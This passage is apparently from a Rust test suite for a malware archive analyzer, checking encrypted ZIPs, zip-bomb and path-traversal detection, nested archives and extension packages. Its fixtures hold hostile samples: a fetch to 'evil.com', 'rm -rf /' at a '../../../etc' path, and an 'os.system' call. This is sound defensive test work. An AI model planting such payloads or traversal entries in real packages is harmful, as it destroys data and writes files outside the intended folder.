    let mut zip = zip::ZipWriter::new(file);
    let options = SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Stored)
        .with_aes_encryption(zip::AesMode::Aes256, "secret");
    zip.start_file("test.txt", options).unwrap();
    zip.write_all(b"hello world").unwrap();
    zip.finish().unwrap();

    // Analyze with wrong password
    // An encrypted archive is still analyzed: the central directory names the
    // member and flags it encrypted, and the failure says why it was not read.
    let analyzer = ArchiveAnalyzer::new().with_zip_passwords(vec!["wrongpass".to_string()]);
    let report = analyzer
        .analyze(&zip_path)
        .expect("encrypted archive keeps its listing");
    assert!(
        report
            .metadata
            .errors
            .iter()
            .any(|e| e.contains("tried 1 passwords")),
        "errors should record the failed password attempt: {:?}",
        report.metadata.errors
    );
    assert!(
        report
            .archive_contents
            .iter()
            .any(|entry| entry.path == "test.txt" && entry.encrypted),
        "listing should keep the encrypted member"
    );
}

#[test]
fn test_encrypted_zip_no_passwords_configured() {
    use zip::unstable::write::FileOptionsExt;
    use zip::write::SimpleFileOptions;

    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("encrypted.zip");

    // Create encrypted zip
    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options = SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Stored)
        .with_deprecated_encryption(b"secret")
        .unwrap();
    zip.start_file("test.txt", options).unwrap();
    zip.write_all(b"hello world").unwrap();
    zip.finish().unwrap();

    // Analyze with no passwords (default): the member cannot be read, but the
    // archive still reports its encrypted listing and why extraction failed.
    let analyzer = ArchiveAnalyzer::new();
    let report = analyzer
        .analyze(&zip_path)
        .expect("encrypted archive keeps its listing");
    assert!(
        !report.metadata.errors.is_empty(),
        "errors should record why the member was not read"
    );
    assert!(
        report
            .archive_contents
            .iter()
            .any(|entry| entry.path == "test.txt" && entry.encrypted),
        "listing should keep the encrypted member"
    );
}

#[test]
fn test_encrypted_zip_multiple_passwords_finds_correct() {
    use zip::unstable::write::FileOptionsExt;
    use zip::write::SimpleFileOptions;

    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("encrypted.zip");

    // Create encrypted zip with password "correct"
    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options = SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Stored)
        .with_deprecated_encryption(b"correct")
        .unwrap();
    zip.start_file("test.txt", options).unwrap();
    zip.write_all(b"hello world").unwrap();
    zip.finish().unwrap();

    // Analyze with multiple passwords, correct one is third
    let analyzer = ArchiveAnalyzer::new().with_zip_passwords(vec![
        "wrong1".to_string(),
        "wrong2".to_string(),
        "correct".to_string(),
        "wrong3".to_string(),
    ]);
    let result = analyzer.analyze(&zip_path);
    assert!(
        result.is_ok(),
        "Should find correct password among multiple"
    );
}

#[test]
fn test_unencrypted_zip_works_with_passwords_configured() {
    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("unencrypted.zip");

    // Create unencrypted zip
    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options =
        zip::write::FileOptions::<()>::default().compression_method(zip::CompressionMethod::Stored);
    zip.start_file("test.txt", options).unwrap();
    zip.write_all(b"hello world").unwrap();
    zip.finish().unwrap();

    // Should work even with passwords configured
    let analyzer =
        ArchiveAnalyzer::new().with_zip_passwords(vec!["pass1".to_string(), "pass2".to_string()]);
    let result = analyzer.analyze(&zip_path);
    assert!(
        result.is_ok(),
        "Unencrypted zip should work with passwords configured"
    );
}

#[test]
fn test_extract_zip_with_password_helper() {
    use std::io::Write;
    use zip::unstable::write::FileOptionsExt;
    use zip::write::SimpleFileOptions;

    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("encrypted.zip");
    let extract_dir = temp_dir.path().join("extracted");
    fs::create_dir_all(&extract_dir).unwrap();

    // Create encrypted zip
    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options = SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Stored)
        .with_deprecated_encryption(b"testpass")
        .unwrap();
    zip.start_file("data.txt", options).unwrap();
    zip.write_all(b"secret data").unwrap();
    zip.finish().unwrap();

    // Test the extract helper directly
    let _analyzer = ArchiveAnalyzer::new();
    let guard = ExtractionGuard::new();
    let file = File::open(&zip_path).unwrap();
    let mut archive = zip::ZipArchive::new(file).unwrap();

    let result =
        super::zip::extract_zip_entries_safe(&mut archive, &extract_dir, Some(b"testpass"), &guard);
    assert!(result.is_ok(), "Should extract with correct password");

    // Verify file was extracted
    let extracted_file = extract_dir.join("data.txt");
    assert!(extracted_file.exists(), "Extracted file should exist");
    let bytes = fs::read(&extracted_file).unwrap();
    let content = String::from_utf8_lossy(&bytes);
    assert_eq!(content, "secret data");
}

#[test]
fn test_path_traversal_detection() {
    // Test that path traversal attempts are detected
    assert!(sanitize_entry_path("../etc/passwd", Path::new("/tmp/test")).is_none());
    assert!(sanitize_entry_path("foo/../../etc/passwd", Path::new("/tmp/test")).is_none());
    assert!(sanitize_entry_path("/etc/passwd", Path::new("/tmp/test")).is_none());

    // Valid paths should work
    assert!(sanitize_entry_path("foo/bar.txt", Path::new("/tmp/test")).is_some());
    assert!(sanitize_entry_path("./foo/bar.txt", Path::new("/tmp/test")).is_some());
}

#[test]
fn member_limit_telemetry_does_not_downgrade_unsafe_entries() {
    let mut report = AnalysisReport::new(TargetInfo::default());
    push_archive_hostile_findings(
        &mut report,
        vec![
            HostileArchiveReason::ExcessiveFileCount(MAX_FILE_COUNT + 1),
            HostileArchiveReason::PathTraversal("../outside.txt".to_string()),
        ],
        Path::new("renamed.zip"),
        "archive_analyzer",
        false,
    );
    let limit = report
        .findings
        .iter()
        .find(|f| f.id == "metadata/archive/layout::archive-member-limit-reached")
        .unwrap();
    assert_eq!(limit.crit, Criticality::Notable);
    assert!(
        report.findings.iter().any(
            |f| f.id.starts_with("anti-analysis/archive/") && f.crit >= Criticality::Suspicious
        )
    );
}

#[test]
fn test_extraction_guard_limits() {
    let guard = ExtractionGuard::new();

    // File count tracking
    for _ in 0..MAX_FILE_COUNT {
        assert!(guard.check_file_count());
    }
    assert!(!guard.check_file_count()); // Should fail on next

    // Verify hostile reason was recorded
    let reasons = guard.take_reasons();
    assert!(
        reasons
            .iter()
            .any(|r| matches!(r, HostileArchiveReason::ExcessiveFileCount(_)))
    );
}

#[test]
fn test_compression_ratio_detection() {
    let guard = ExtractionGuard::new();

    // Normal ratio should pass
    assert!(guard.check_compression_ratio(1000, 2000)); // 2:1

    // Suspicious ratio above the minimum material expansion size should fail
    assert!(!guard.check_compression_ratio(100, 300_000_000)); // 3_000_000:1

    let reasons = guard.take_reasons();
    assert!(
        reasons
            .iter()
            .any(|r| matches!(r, HostileArchiveReason::ZipBomb { .. }))
    );
}
#[test]
fn test_nested_archive_zip_containing_tar_gz() {
    use flate2::Compression;
    use flate2::write::GzEncoder;
    use tar::Builder;

    let temp_dir = tempfile::tempdir().unwrap();
    let outer_zip_path = temp_dir.path().join("outer.zip");

    // Create inner.tar.gz with a shell script
    let inner_tar_gz_data = {
        let mut tar_data = Vec::new();
        {
            let enc = GzEncoder::new(&mut tar_data, Compression::default());
            let mut tar_builder = Builder::new(enc);

            // Add a shell script
            let script_content = b"#!/bin/sh\necho hello\ncurl http://example.com";
            let mut header = tar::Header::new_gnu();
            header.set_path("script.sh").unwrap();
            header.set_size(script_content.len() as u64);
            header.set_mode(0o755);
            header.set_cksum();
            tar_builder.append(&header, &script_content[..]).unwrap();
            tar_builder.finish().unwrap();
        }
        tar_data
    };

    // Create outer.zip containing inner.tar.gz
    {
        let file = File::create(&outer_zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);
        zip.start_file("inner.tar.gz", options).unwrap();
        std::io::Write::write_all(&mut zip, &inner_tar_gz_data).unwrap();
        zip.finish().unwrap();
    }

    // Analyze the nested archive
    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&outer_zip_path);
    assert!(result.is_ok(), "Should analyze nested archive");

    let report = result.unwrap();

    // Check archive_contents includes both inner.tar.gz and nested file
    assert!(
        !report.archive_contents.is_empty(),
        "Should have archive_contents"
    );

    // Should have entry for inner.tar.gz
    let has_inner = report
        .archive_contents
        .iter()
        .any(|e| e.path == "inner.tar.gz");
    assert!(has_inner, "Should have inner.tar.gz entry");

    // Should have entry for nested script with ! separator
    let has_nested = report
        .archive_contents
        .iter()
        .any(|e| e.path == "inner.tar.gz!script.sh");
    assert!(
        has_nested,
        "Should have nested entry with ! separator: {:?}",
        report.archive_contents
    );
}

#[test]
fn test_archive_member_metadata_captured() {
    use flate2::Compression;
    use flate2::write::GzEncoder;
    use tar::Builder;

    let temp_dir = tempfile::tempdir().unwrap();
    let outer_zip_path = temp_dir.path().join("outer.zip");

    // tar.gz containing one file with explicit mode + mtime
    let inner_tar_gz_data = {
        let mut tar_data = Vec::new();
        {
            let enc = GzEncoder::new(&mut tar_data, Compression::default());
            let mut tar_builder = Builder::new(enc);
            let content = b"#!/bin/sh\necho hi";
            let mut header = tar::Header::new_gnu();
            header.set_path("payload.sh").unwrap();
            header.set_size(content.len() as u64);
            header.set_mode(0o755);
            header.set_mtime(1_700_000_000);
            header.set_uid(1000);
            header.set_gid(1000);
            header.set_username("alice").unwrap();
            header.set_groupname("staff").unwrap();
            header.set_cksum();
            tar_builder.append(&header, &content[..]).unwrap();
            tar_builder.finish().unwrap();
        }
        tar_data
    };

    // ZIP wrapping the tar.gz, Stored compression so we can assert it.
    {
        let file = File::create(&outer_zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);
        zip.start_file("inner.tar.gz", options).unwrap();
        std::io::Write::write_all(&mut zip, &inner_tar_gz_data).unwrap();
        zip.finish().unwrap();
    }

    let report = ArchiveAnalyzer::new().analyze(&outer_zip_path).unwrap();

    let outer = report
        .archive_contents
        .iter()
        .find(|e| e.path == "inner.tar.gz")
        .expect("outer ZIP member missing");
    assert_eq!(
        outer.compression_method.as_deref(),
        Some("stored"),
        "ZIP compression_method should be 'stored' for the outer entry"
    );
    assert_eq!(outer.entry_type.as_deref(), Some("regular"));

    let inner = report
        .archive_contents
        .iter()
        .find(|e| e.path == "inner.tar.gz!payload.sh")
        .expect("nested tar member missing");
    assert_eq!(
        inner.mode_octal,
        Some(0o755),
        "nested tar entry should preserve mode_octal"
    );
    assert_eq!(inner.mtime_unix, Some(1_700_000_000));
    assert_eq!(inner.uid, Some(1000));
    assert_eq!(inner.gid, Some(1000));
    assert_eq!(inner.uname.as_deref(), Some("alice"));
    assert_eq!(inner.gname.as_deref(), Some("staff"));
    assert_eq!(inner.entry_type.as_deref(), Some("regular"));
}

#[test]
fn test_nested_archive_path_format() {
    let analyzer = ArchiveAnalyzer::new();

    // Test format_entry_path without prefix
    assert_eq!(analyzer.format_entry_path("file.txt"), "file.txt");

    // Test format_evidence_location without prefix
    assert_eq!(
        analyzer.format_evidence_location("file.txt"),
        "archive:file.txt"
    );

    // Test with prefix
    let nested_analyzer = ArchiveAnalyzer::new().with_archive_prefix("inner.zip".to_string());
    assert_eq!(
        nested_analyzer.format_entry_path("file.txt"),
        "inner.zip!file.txt"
    );
    assert_eq!(
        nested_analyzer.format_evidence_location("file.txt"),
        "archive:inner.zip!file.txt"
    );
}

#[test]
fn test_nested_archive_max_depth() {
    // Create analyzer at max depth
    let at_max = ArchiveAnalyzer::new().with_depth(3);
    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("test.zip");

    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options =
        zip::write::FileOptions::<()>::default().compression_method(zip::CompressionMethod::Stored);
    zip.start_file("test.txt", options).unwrap();
    std::io::Write::write_all(&mut zip, b"hello").unwrap();
    zip.finish().unwrap();

    // Should fail because we're at max depth
    let result = at_max.analyze(&zip_path);
    assert!(result.is_err(), "Should fail at max depth");
    assert!(
        result
            .unwrap_err()
            .to_string()
            .contains("Maximum archive depth"),
        "Error should mention depth"
    );
}

// =========================================================================
// Extraction tests for new archive formats
// =========================================================================

#[test]
fn test_extract_vsix() {
    // Create a VSIX (VS Code extension) with typical content
    let temp_dir = tempfile::tempdir().unwrap();
    let vsix_path = temp_dir.path().join("extension.vsix");

    let file = File::create(&vsix_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options = zip::write::FileOptions::<()>::default()
        .compression_method(zip::CompressionMethod::Deflated);

    // Add typical VSIX files
    zip.start_file("extension.vsixmanifest", options).unwrap();
    std::io::Write::write_all(&mut zip, b"<?xml version=\"1.0\"?>").unwrap();

    zip.start_file("package.json", options).unwrap();
    std::io::Write::write_all(&mut zip, b"{\"name\": \"test-extension\"}").unwrap();

    zip.start_file("extension/index.js", options).unwrap();
    std::io::Write::write_all(&mut zip, b"console.log('malicious code');").unwrap();

    zip.finish().unwrap();

    // Analyze the VSIX
    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&vsix_path);

    assert!(result.is_ok());
    let report = result.unwrap();
    // A `.vsix` now carries its own ecosystem type (still extracted as a zip).
    assert_eq!(report.target.file_type, "vsix");
    assert!(!report.archive_contents.is_empty());

    // Verify files were extracted and analyzed
    assert!(
        report
            .archive_contents
            .iter()
            .any(|e| e.path.contains("package.json"))
    );
    assert!(
        report
            .archive_contents
            .iter()
            .any(|e| e.path.contains("index.js"))
    );
}

#[test]
fn test_extract_xpi() {
    // Create an XPI (Firefox extension)
    let temp_dir = tempfile::tempdir().unwrap();
    let xpi_path = temp_dir.path().join("addon.xpi");

    let file = File::create(&xpi_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options = zip::write::FileOptions::<()>::default()
        .compression_method(zip::CompressionMethod::Deflated);

    zip.start_file("manifest.json", options).unwrap();
    std::io::Write::write_all(&mut zip, b"{\"manifest_version\": 2}").unwrap();

    zip.start_file("background.js", options).unwrap();
    std::io::Write::write_all(&mut zip, b"// suspicious script\nfetch('http://evil.com');")
        .unwrap();

    zip.finish().unwrap();

    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&xpi_path);

    assert!(result.is_ok());
    let report = result.unwrap();
    assert!(!report.archive_contents.is_empty());
    assert!(
        report
            .archive_contents
            .iter()
            .any(|e| e.path.contains("background.js"))
    );
}

#[test]
fn test_extract_ipa() {
    // Create an IPA (iOS app)
    let temp_dir = tempfile::tempdir().unwrap();
    let ipa_path = temp_dir.path().join("app.ipa");

    let file = File::create(&ipa_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options = zip::write::FileOptions::<()>::default()
        .compression_method(zip::CompressionMethod::Deflated);

    zip.start_file("Payload/App.app/Info.plist", options)
        .unwrap();
    std::io::Write::write_all(&mut zip, b"<?xml version=\"1.0\"?>").unwrap();

    zip.start_file("Payload/App.app/executable", options)
        .unwrap();
    std::io::Write::write_all(&mut zip, b"\x00\x00\x00\x00").unwrap();

    zip.finish().unwrap();

    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&ipa_path);

    assert!(result.is_ok());
    let report = result.unwrap();
    assert!(
        report
            .archive_contents
            .iter()
            .any(|e| e.path.contains("Info.plist"))
    );
}

#[test]
fn test_extract_epub() {
    // Create an EPUB (eBook)
    let temp_dir = tempfile::tempdir().unwrap();
    let epub_path = temp_dir.path().join("book.epub");

    let file = File::create(&epub_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options =
        zip::write::FileOptions::<()>::default().compression_method(zip::CompressionMethod::Stored);

    // EPUB requires specific structure
    zip.start_file("mimetype", options).unwrap();
    std::io::Write::write_all(&mut zip, b"application/epub+zip").unwrap();

    zip.start_file("META-INF/container.xml", options).unwrap();
    std::io::Write::write_all(&mut zip, b"<?xml version=\"1.0\"?>").unwrap();

    zip.start_file("OEBPS/content.opf", options).unwrap();
    std::io::Write::write_all(&mut zip, b"<?xml version=\"1.0\"?>").unwrap();

    zip.finish().unwrap();

    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&epub_path);

    assert!(result.is_ok());
    let report = result.unwrap();
    assert!(report.archive_contents.iter().any(|e| e.path == "mimetype"));
}

#[test]
fn test_extract_crx() {
    // Create a CRX (Chrome extension) - ZIP with special header
    let temp_dir = tempfile::tempdir().unwrap();
    let crx_path = temp_dir.path().join("extension.crx");

    // Create a ZIP first
    let zip_data = {
        let mut buf = Vec::new();
        let mut zip = zip::ZipWriter::new(Cursor::new(&mut buf));
        let options = zip::write::FileOptions::<()>::default();

        zip.start_file("manifest.json", options).unwrap();
        std::io::Write::write_all(&mut zip, b"{\"manifest_version\": 3}").unwrap();

        zip.start_file("background.js", options).unwrap();
        std::io::Write::write_all(&mut zip, b"console.log('loaded');").unwrap();

        zip.finish().unwrap();
        buf
    };

    // Write CRX file with header (CRX2 format)
    let mut crx_file = File::create(&crx_path).unwrap();

    // CRX2 header: "Cr24" + version=2 (4) + pubkey_len (4) + sig_len (4)
    std::io::Write::write_all(&mut crx_file, b"Cr24").unwrap(); // Magic
    std::io::Write::write_all(&mut crx_file, &2u32.to_le_bytes()).unwrap(); // Version
    std::io::Write::write_all(&mut crx_file, &32u32.to_le_bytes()).unwrap(); // Pubkey len
    std::io::Write::write_all(&mut crx_file, &64u32.to_le_bytes()).unwrap(); // Sig len

    // Fake public key (32 bytes)
    std::io::Write::write_all(&mut crx_file, &[0u8; 32]).unwrap();

    // Fake signature (64 bytes)
    std::io::Write::write_all(&mut crx_file, &[0u8; 64]).unwrap();

    // ZIP data
    std::io::Write::write_all(&mut crx_file, &zip_data).unwrap();

    // Analyze the CRX
    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&crx_path);

    assert!(result.is_ok());
    let report = result.unwrap();
    assert_eq!(report.target.file_type, "crx");
    assert!(!report.archive_contents.is_empty());
    assert!(
        report
            .archive_contents
            .iter()
            .any(|e| e.path.contains("manifest.json"))
    );
    assert!(
        report
            .metadata
            .tools_used
            .iter()
            .any(|t| t == "in_memory_zip"),
        "small CRX archives should use the in-memory ZIP member path"
    );
}

#[test]
fn test_vsix_path_traversal_protection() {
    // Create a malicious VSIX with path traversal attempt
    let temp_dir = tempfile::tempdir().unwrap();
    let vsix_path = temp_dir.path().join("malicious.vsix");

    let file = File::create(&vsix_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options = zip::write::FileOptions::<()>::default();

    // Try to escape with ../
    zip.start_file("../../../etc/evil.sh", options).unwrap();
    std::io::Write::write_all(&mut zip, b"#!/bin/sh\nrm -rf /").unwrap();

    zip.start_file("package.json", options).unwrap();
    std::io::Write::write_all(&mut zip, b"{}").unwrap();

    zip.finish().unwrap();

    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&vsix_path);

    // Should succeed but flag the hostile entry
    assert!(result.is_ok());
    let report = result.unwrap();

    // Path traversal entry is recorded in archive_contents (metadata inspection)
    // but the actual file is not extracted to disk (extraction guard blocks it)
    assert!(
        report
            .archive_contents
            .iter()
            .any(|e| e.path.contains("etc/evil")),
        "path traversal entry should be visible in archive_contents metadata"
    );

    // Should have detected path traversal as a hostile finding
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id.contains("path-traversal")),
        "should detect path traversal, findings: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
fn test_zip_path_traversal_findings_are_grouped() {
    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("grouped.zip");

    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options = zip::write::FileOptions::<()>::default();

    zip.start_file("../etc/evil.sh", options).unwrap();
    std::io::Write::write_all(&mut zip, b"#!/bin/sh\necho evil").unwrap();

    zip.start_file("../../tmp/dropper.ps1", options).unwrap();
    std::io::Write::write_all(&mut zip, b"Write-Host evil").unwrap();

    zip.finish().unwrap();

    let analyzer = ArchiveAnalyzer::new();
    let report = analyzer.analyze(&zip_path).unwrap();

    let path_findings: Vec<_> = report
        .findings
        .iter()
        .filter(|f| f.id == "anti-analysis/archive/path-traversal")
        .collect();
    assert_eq!(path_findings.len(), 1);
    assert_eq!(path_findings[0].match_count, 2);
    assert_eq!(path_findings[0].evidence.len(), 2);
}

#[test]
/// A ZIP full of path edge cases still reports its traversal entries: the
/// shape of an archive is the attacker's to choose, so it excuses nothing.
fn test_zip_path_edge_case_corpus_still_reports_zip_slip() {
    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("mixed-paths.zip");

    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options =
        zip::write::FileOptions::<()>::default().compression_method(zip::CompressionMethod::Stored);

    let entries = [
        "First",
        "../One Level Up",
        "../../Two Levels Up",
        "/At The Top",
        "/../Over The Top",
        "/",
        "../",
        ".",
        "..",
        "...",
        "....",
        "/.",
        "a/.",
        "a/./",
        "a/./b",
        "a/..",
        "a/../",
        "a/../b",
        ".One",
        "..Two",
        "...Three",
        "Tab \t",
        "Star *",
        "Dot .",
        "Ampersand &",
        "Hash #",
        "Dollar $",
        "Euro €",
        "Pipe |",
        "Smile 🙂",
        "Tilde ~",
        "Colon :",
        "Semicolon ;",
        "Percent %",
        "Caret ^",
        "At @",
        "Comma ,",
        "Exclamation !",
        "Dash -",
        "Plus +",
        "Equal =",
        "Underscore _",
        "Question ?",
        "Backtick `",
        "Quote '",
        "Double quote \"",
        "Backslash1→\\",
        "\\←Backslash2",
        "Backslash3→\\←Backslash4",
        "C:",
        "C:\\",
        "C:\\Temp",
        "C:\\Temp\\File",
        "\\\\server\\share\\file",
        "u/v//w///x//y/z",
        " ",
        "~",
        "%TMP",
        "$HOME",
        "-",
        "Space→ ",
        " ←Space",
        "Angle <>",
        "Square []",
        "Round ()",
        "Curly {}",
        "Delete \x7f",
        "Escape \x1b",
        "Backspace \x08",
        "Line Feed \n",
        "Carriage Return \r",
        "Bell \x07",
        "String Terminator \u{009c}",
        "Empty/",
        "/Empty/",
        "FileOrDir",
        "FileOrDir/",
        "FileOrDir/File",
        "Case",
        "case",
        "CASE",
        "NUL",
        "NUL.txt",
        "NUL.tar.gz",
        "NUL..txt",
        " NUL.txt",
        "c/NUL",
        "CON",
        "PRN",
        "AUX",
        "COM1",
        "COM2",
        "COM3",
        "COM4",
        "COM5",
        "COM6",
        "COM7",
        "COM8",
        "COM9",
        "LPT1",
        "LPT2",
        "LPT3",
        "LPT4",
        "LPT5",
        "LPT6",
        "LPT7",
        "LPT8",
        "LPT9",
        "CLOCK$",
        "/dev/null",
        "Last",
    ];

    for name in entries {
        zip.start_file(name, options).unwrap();
        std::io::Write::write_all(&mut zip, b"fixture").unwrap();
    }

    zip.finish().unwrap();

    let analyzer = ArchiveAnalyzer::new();
    let report = analyzer.analyze(&zip_path).unwrap();

    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id == "anti-analysis/archive/path-traversal")
    );
}

#[test]
fn test_validate_traits_library_entrypoint() {
    // Smoke test: full validation reaches the public API and returns
    // a `Result` instead of panicking. Pointed at a synthetic traits
    // directory rather than the configured rule set — running full
    // validation across the 6490-file production tree takes 60+ s
    // and was bottlenecking the entire test suite. Regressions in
    // the validator itself (panics, infinite loops, missing-dir
    // handling) still surface here.
    let temp_dir = tempfile::tempdir().unwrap();
    let traits_dir = temp_dir.path().join("traits");
    std::fs::create_dir(&traits_dir).unwrap();
    std::fs::write(
        traits_dir.join("smoke.yaml"),
        r#"
traits:
  - id: "smoke/test::trait"
    desc: "Smoke-test trait"
    crit: baseline
    if:
      type: symbol
      pattern: "smoke_test_symbol"
"#,
    )
    .unwrap();

    let _ = crate::capabilities::CapabilityMapper::from_directory(&traits_dir);
}

#[test]
fn test_extract_python_packages() {
    // Test .egg and .whl extraction
    let temp_dir = tempfile::tempdir().unwrap();

    // Create .whl file
    let whl_path = temp_dir.path().join("package.whl");
    let file = File::create(&whl_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options = zip::write::FileOptions::<()>::default();

    zip.start_file("package/__init__.py", options).unwrap();
    std::io::Write::write_all(&mut zip, b"import os; os.system('evil')").unwrap();

    zip.start_file("package-1.0.0.dist-info/METADATA", options)
        .unwrap();
    std::io::Write::write_all(&mut zip, b"Name: package").unwrap();

    zip.finish().unwrap();

    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&whl_path);

    assert!(result.is_ok());
    let report = result.unwrap();
    assert!(!report.archive_contents.is_empty());
    assert!(
        report
            .archive_contents
            .iter()
            .any(|e| e.path.contains("__init__.py"))
    );
}

#[test]
fn test_extract_7z() {
    // Create a 7z archive
    let temp_dir = tempfile::tempdir().unwrap();
    let sz_path = temp_dir.path().join("archive.7z");

    // Create a simple file to compress
    let src_dir = temp_dir.path().join("src");
    fs::create_dir(&src_dir).unwrap();
    let test_file = src_dir.join("test.txt");
    fs::write(&test_file, b"test content").unwrap();

    // Use sevenz_rust to create the archive
    use sevenz_rust::SevenZWriter;
    let mut sz = SevenZWriter::create(&sz_path).unwrap();
    // Push the source directory to get proper paths
    sz.push_source_path(&src_dir, |_| true).unwrap();
    sz.finish().unwrap();

    // Analyze the 7z
    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&sz_path);

    assert!(result.is_ok());
    let report = result.unwrap();
    assert_eq!(report.target.file_type, "7z");
    assert!(!report.archive_contents.is_empty());
    assert!(
        report
            .archive_contents
            .iter()
            .any(|e| e.path.contains("test.txt"))
    );
}

#[test]
fn test_extract_7z_encrypted() {
    let manifest_dir = std::env::var("CARGO_MANIFEST_DIR").unwrap_or_else(|_| ".".to_string());
    let sz_path = Path::new(&manifest_dir)
        .join("testdata")
        .join("encrypted.7z");

    // Skip if the test file is missing (though it should be in the repo)
    if !sz_path.exists() {
        eprintln!("Skipping test_extract_7z_encrypted: testdata/encrypted.7z missing");
        return;
    }

    // Analyze without password should fail
    let analyzer_no_pass = ArchiveAnalyzer::new();
    let result = analyzer_no_pass.analyze(&sz_path);
    assert!(result.is_err());

    // Analyze with wrong password should fail
    let analyzer_wrong_pass = ArchiveAnalyzer::new().with_zip_passwords(vec!["wrong".to_string()]);
    let result = analyzer_wrong_pass.analyze(&sz_path);
    assert!(result.is_err());

    // Analyze with correct password should succeed
    let analyzer_correct_pass =
        ArchiveAnalyzer::new().with_zip_passwords(vec!["secret".to_string()]);
    let result = analyzer_correct_pass.analyze(&sz_path);

    assert!(result.is_ok(), "Failed to decrypt 7z: {:?}", result.err());
    let report = result.unwrap();
    assert_eq!(report.target.file_type, "7z");
    assert!(
        report
            .archive_contents
            .iter()
            .any(|e| e.path.contains("secret_test.txt"))
    );
}

#[test]
fn test_7z_mislabeled_zip() {
    // Test that a ZIP file with .7z extension is handled correctly
    let temp_dir = tempfile::tempdir().unwrap();
    let mislabeled_path = temp_dir.path().join("actually_a_zip.7z");

    // Create a ZIP archive but save it with .7z extension
    let file = File::create(&mislabeled_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options = zip::write::SimpleFileOptions::default();
    zip.start_file("test.txt", options).unwrap();
    zip.write_all(b"test content from zip").unwrap();
    zip.finish().unwrap();

    // Verify the file starts with ZIP magic bytes
    let mut file = File::open(&mislabeled_path).unwrap();
    let mut magic = [0u8; 4];
    std::io::Read::read_exact(&mut file, &mut magic).unwrap();
    assert_eq!(magic, [0x50, 0x4B, 0x03, 0x04]); // PK\x03\x04

    // Analyze the mislabeled archive - should succeed
    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&mislabeled_path);

    assert!(
        result.is_ok(),
        "Failed to analyze mislabeled .7z: {:?}",
        result.err()
    );
    let report = result.unwrap();
    assert!(!report.archive_contents.is_empty());
    assert!(
        report
            .archive_contents
            .iter()
            .any(|e| e.path.contains("test.txt"))
    );
}

#[test]
#[ignore] // Slow test: creates 101MB file and compresses it (~60s). Run with: cargo test -- --ignored
fn test_7z_size_limit_protection() {
    // Test that 7z respects file size limits
    let temp_dir = tempfile::tempdir().unwrap();
    let sz_path = temp_dir.path().join("large.7z");

    // Create a file that's too large (> 100MB would be caught)
    let src_dir = temp_dir.path().join("src");
    fs::create_dir(&src_dir).unwrap();
    let large_file = src_dir.join("huge.bin");

    // Create a 101MB file (must be >100MB to trigger MAX_FILE_SIZE detection)
    let large_data = vec![0u8; 101 * 1024 * 1024];
    fs::write(&large_file, large_data).unwrap();

    use sevenz_rust::SevenZWriter;
    let mut sz = SevenZWriter::create(&sz_path).unwrap();
    // Push the directory to properly archive the large file
    sz.push_source_path(&src_dir, |_| true).unwrap();
    sz.finish().unwrap();

    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&sz_path);

    // Should succeed but flag the oversized file
    assert!(result.is_ok());
    let report = result.unwrap();

    // Should have detected excessive file size
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id == "anti-analysis/archive/large-file"
                && f.desc.contains("excessively large file"))
    );
}

// =========================================================================
// Container-level composite evaluation tests
// =========================================================================

#[test]
fn test_container_composite_findings_collection() {
    // Test that findings from nested files are collected for container-level evaluation
    // This test creates a ZIP with multiple files and verifies the archive analysis
    // infrastructure collects findings properly (even without specific composite rules).

    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("package.zip");

    // Create a ZIP with multiple files that could trigger cross-file composites
    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options =
        zip::write::FileOptions::<()>::default().compression_method(zip::CompressionMethod::Stored);

    // Add package.json (npm package indicator)
